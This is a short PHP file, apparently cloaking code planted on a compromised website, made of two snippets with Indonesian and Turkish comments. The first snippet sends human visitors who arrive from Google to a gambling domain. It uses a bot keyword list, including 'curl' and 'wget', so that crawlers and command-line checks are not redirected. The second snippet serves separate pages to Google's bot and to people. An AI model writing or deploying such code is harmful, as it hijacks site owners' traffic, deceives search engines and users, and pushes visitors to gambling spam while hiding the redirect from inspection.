<?php
// Daftar kata kunci bot umum di User-Agent
$bot_keywords = [
    'bot', 'crawl', 'spider', 'slurp', 'mediapartners', 'facebookexternalhit',
    'google', 'bing', 'yahoo', 'yandex', 'baidu', 'duckduckgo', 'curl', 'wget'
];

// Ambil referer dan user-agent
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';

// Cek apakah user-agent mengandung kata kunci bot
$is_bot = false;
foreach ($bot_keywords as $keyword) {
    if (strpos($user_agent, strtolower($keyword)) !== false) {
        $is_bot = true;
        break;
    }
}

// Cek jika referer dari Google dan bukan bot
if (!$is_bot && strpos($referer, 'google') !== false) {
    header('Location: https://jjsanmar.situstoto-4d.com/');
    exit;
}
?>
<?php
// Kullanıcı IP'si ve User-Agent'ı kontrol et
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü

// Google ile ilgili user-agent kontrolleri
if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false) {
    include('care.php');  // Google bot ise google.php göster
} elseif ($is_mobile) {
    include('home.php');  // Mobil cihaz ise kullanici.php göster
} else {
    include('home.php');  // Diğer durumlar için default içerik
}
?>
